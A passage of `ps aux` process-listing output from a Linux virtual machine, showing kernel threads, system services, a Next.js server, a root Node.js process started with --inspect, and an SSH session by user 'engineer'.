root          53  0.0  0.0      0     0 ?        S    14:50   0:00 [watchdogd]
root          54  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-quota]
root          55  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/0:1H-kblockd]
root          56  0.0  0.0      0     0 ?        S    14:50   0:00 [kswapd0]
root          57  0.0  0.0      0     0 ?        S    14:50   0:00 [ecryptfs-kthread]
root          58  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-kthro]
root          59  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/24-pciehp]
root          60  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/25-pciehp]
root          61  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/26-pciehp]
root          62  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/27-pciehp]
root          63  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/28-pciehp]
root          64  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/29-pciehp]
root          65  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/30-pciehp]
root          66  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/31-pciehp]
root          67  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/32-pciehp]
root          68  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/33-pciehp]
root          69  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/34-pciehp]
root          70  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/35-pciehp]
root          71  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/36-pciehp]
root          72  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/37-pciehp]
root          73  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/38-pciehp]
root          74  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/39-pciehp]
root          75  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/40-pciehp]
root          76  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/41-pciehp]
root          77  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/42-pciehp]
root          78  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/43-pciehp]
root          79  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/44-pciehp]
root          80  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/45-pciehp]
root          81  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/46-pciehp]
root          82  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/47-pciehp]
root          83  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/48-pciehp]
root          84  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/49-pciehp]
root          85  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/50-pciehp]
root          86  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/51-pciehp]
root          87  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/52-pciehp]
root          88  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/53-pciehp]
root          89  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/54-pciehp]
root          90  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/55-pciehp]
root          91  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-acpi_]
root          93  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_0]
root          94  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root          95  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_1]
root          96  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root          99  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-mld]
root         100  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/1:1H]
root         101  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-ipv6_]
root         102  0.0  0.0      0     0 ?        I    14:50   0:00 [kworker/u256:1-ext4-rs
root         110  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-kstrp]
root         112  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/u259:0]
root         113  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/u260:0]
root         114  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/u261:0]
root         127  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-charg]
root         193  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_2]
root         194  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         195  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_3]
root         196  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         197  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_4]
root         198  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         199  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_5]
root         200  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         201  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-mpt_p]
root         202  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-mpt/0]
root         203  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_6]
root         204  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         205  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_7]
root         206  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         207  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_8]
root         208  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         209  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_9]
root         210  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         211  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_10]
root         212  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         213  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_11]
root         214  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         215  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_12]
root         216  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         217  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_13]
root         218  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         219  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_14]
root         220  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         221  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_15]
root         222  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         223  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_16]
root         224  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         225  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_17]
root         226  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         227  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_18]
root         228  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         229  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_19]
root         230  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         231  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_20]
root         232  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         233  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_21]
root         234  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         235  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_22]
root         236  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         237  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_23]
root         238  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         239  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_24]
root         240  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         241  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_25]
root         242  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         243  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_26]
root         244  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         245  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_27]
root         246  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         247  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_28]
root         248  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         249  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_29]
root         250  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         251  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_30]
root         252  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         253  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_31]
root         254  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         282  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_32]
root         283  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-scsi_]
root         294  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-kdmfl]
root         320  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-raid5]
root         353  0.0  0.0      0     0 ?        D    14:50   0:00 [jbd2/dm-0-8]
root         354  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-ext4-]
root         402  0.0  0.3  66900 13740 ?        S<s  14:50   0:00 /usr/lib/systemd/system
root         460  0.0  0.2  31280 10076 ?        Ss   14:50   0:00 /usr/lib/systemd/system
root         462  0.0  0.0      0     0 ?        S    14:50   0:00 [psimon]
root         549  0.0  0.0      0     0 ?        S    14:50   0:00 [jbd2/sda2-8]
root         550  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-ext4-]
systemd+     585  0.0  0.3  21588 12944 ?        Ss   14:50   0:00 /usr/lib/systemd/system
systemd+     590  0.0  0.1  91028  7804 ?        Ssl  14:50   0:00 /usr/lib/systemd/system
root         591  0.0  0.0  85352  2584 ?        R<sl 14:50   0:00 /sbin/auditd
_laurel      597  0.0  0.1  10088  6316 ?        R<   14:50   0:00 /usr/local/sbin/laurel 
root         640  0.0  0.0      0     0 ?        S    14:50   0:00 [audit_prune_tree]
root         664  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/60-vmw_vmci]
root         665  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/61-vmw_vmci]
root         666  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/62-vmw_vmci]
root         700  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/16-vmwgfx]
root         702  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-ttm]
root         713  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/R-crypt]
root         727  0.0  0.3  53468 12192 ?        Ss   14:50   0:00 /usr/bin/VGAuthService
root         730  0.1  0.2 243476 10440 ?        Ssl  14:50   0:07 /usr/bin/vmtoolsd
root         747  0.0  0.0   3940  3232 ?        Ss   14:50   0:00 dhclient -1 -4 -v -i -p
message+     821  0.0  0.1   9852  5512 ?        Ss   14:50   0:00 @dbus-daemon --system -
polkitd      897  0.0  0.2 308164  7940 ?        Ssl  14:50   0:00 /usr/lib/polkit-1/polki
root         910  0.0  0.2  18000  8796 ?        Ss   14:50   0:00 /usr/lib/systemd/system
root         914  0.0  0.3 468980 13424 ?        Ssl  14:50   0:00 /usr/libexec/udisks2/ud
syslog       952  0.0  0.1 222508  6424 ?        Ssl  14:50   0:00 /usr/sbin/rsyslogd -n -
root        1077  0.0  0.3 318300 12716 ?        Ssl  14:50   0:00 /usr/sbin/ModemManager
root        1309  0.0  0.0      0     0 ?        I    14:50   0:00 [kworker/u256:2-ext4-rs
root        1378  0.0  0.0   6824  2856 ?        Ss   14:50   0:00 /usr/sbin/cron -f -P
node        1379  0.0  2.3 11807636 94576 ?      Ssl  14:50   0:05 next-server (v15.0.3)
root        1381  0.0  1.1 1066440 46336 ?       Ssl  14:50   0:00 /usr/bin/node --inspect
root        1396  0.0  0.0   6104  1988 tty1     Ss+  14:50   0:00 /sbin/agetty -o -p -- \
root        1491  0.0  1.0 553092 42748 ?        Ssl  15:00   0:00 /usr/libexec/fwupd/fwup
root        1498  0.0  0.2 313964  8996 ?        Ssl  15:00   0:00 /usr/libexec/upowerd
root        1550  0.0  0.2  12024  8300 ?        Ss   15:19   0:00 sshd: /usr/sbin/sshd -D
root        1577  0.0  0.0      0     0 ?        I    15:25   0:00 [kworker/u258:0-events_
root        1656  0.0  0.0      0     0 ?        I    15:39   0:00 [kworker/u257:0-events_
root        1684  0.0  0.0      0     0 ?        I    15:50   0:00 [kworker/u257:1-events_
root        1732  0.0  0.0      0     0 ?        I    16:13   0:00 [kworker/u258:3-events_
root        1733  0.0  0.0      0     0 ?        I    16:14   0:00 [kworker/u257:3-events_
root        1765  0.0  0.0      0     0 ?        I    16:27   0:00 [kworker/u258:2-events_
root        1767  0.0  0.0      0     0 ?        I    16:27   0:00 [kworker/0:1-events]
root        1779  0.0  0.0      0     0 ?        I    16:30   0:00 [kworker/1:3-events_fre
root        1782  0.0  0.2  14972 10560 ?        Ss   16:32   0:00 sshd: engineer [priv]
root        1785  0.0  0.0      0     0 ?        S    16:32   0:00 [psimon]
engineer    1787  0.0  0.2  20184 11196 ?        Ss   16:32   0:00 /usr/lib/systemd/system
engineer    1789  0.0  0.0  21156  3584 ?        S    16:32   0:00 (sd-pam)
engineer    1799  0.0  0.1  14972  7096 ?        S    16:32   0:00 sshd: engineer@pts/0
engineer    1805  0.0  0.1   8648  5640 pts/0    Ss   16:33   0:00 -bash
root        1839  0.0  0.0      0     0 ?        I    16:34   0:00 [kworker/u258:1-events_
root        1850  0.0  0.0      0     0 ?        I    16:38   0:00 [kworker/u257:2-events_
engineer    1851  100  0.1  10884  4544 pts/0    R+   16:38   0:00 ps aux

```